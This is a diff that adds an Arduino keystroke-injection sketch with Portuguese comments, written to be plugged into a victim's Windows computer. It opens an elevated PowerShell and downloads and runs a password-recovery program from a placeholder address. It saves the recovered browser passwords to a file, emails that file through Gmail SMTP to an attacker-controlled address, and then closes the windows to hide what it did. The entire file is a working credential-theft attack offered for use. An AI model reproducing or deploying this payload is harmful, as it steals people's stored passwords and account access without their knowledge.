@@ -1,0 +1,159 @@
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+
+void setup()
+{
+  Keyboard.begin();
+  delay(3000);
+
+//---> minimiza tudo
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('d');
+  Keyboard.releaseAll();
+  delay(200); 
+  
+  // --> abre cmd
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("cmd");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  
+//--->modifica o teclado pro layout en-US
+
+  Keyboard.print("powershell Start-Process powershell -Verb runAs");
+
+  typeKey(KEY_RETURN);
+
+  delay(3000);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press('y');
+  Keyboard.releaseAll();
+  delay(4000);
+
+  Keyboard.print("Set-WinUserLanguageList -LanguageList en-US");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.press('s');
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(8000);
+  
+//---> baixa e executa o programa, salva o arquivo com as senhas em documentos
+  Keyboard.print("$down = New-Object System.Net.WebClient; $url = 'ENDEREÇO DO PROGRAMA'; $file = 'WBPV.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(10000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('a');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press('s');
+  Keyboard.releaseAll();
+  Keyboard.print("senhas.txt");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  
+//---> envia o e-mail
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.print("cmd");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(1000);
+  
+  Keyboard.print("powershell");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$SMTPInfo.EnableSsl = $true");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('MAILENVIAR@gmail.com', 'SENHA')");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$ReportEmail.From = 'MAILENVIAR@gmail.com'");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$ReportEmail.To.Add('MAILRECEBE@gmail.com')");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$ReportEmail.Subject = 'SenhasChrome'");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$ReportEmail.Body = (Get-Content documents/senhas.txt | out-string)");
+
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+
+  delay(12000);
+
+  Keyboard.print("Set-WinUserLanguageList -LanguageList pt-BR");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  Keyboard.press('s');
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(800);
+  Keyboard.print("exit");
+  typeKey(KEY_RETURN);
+  Keyboard.releaseAll();
+
+//---> fecha tudo 
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll(); 
+  delay(100);
+    Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll(); 
+  delay(100);
+    Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll(); 
+  delay(100);
+  
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
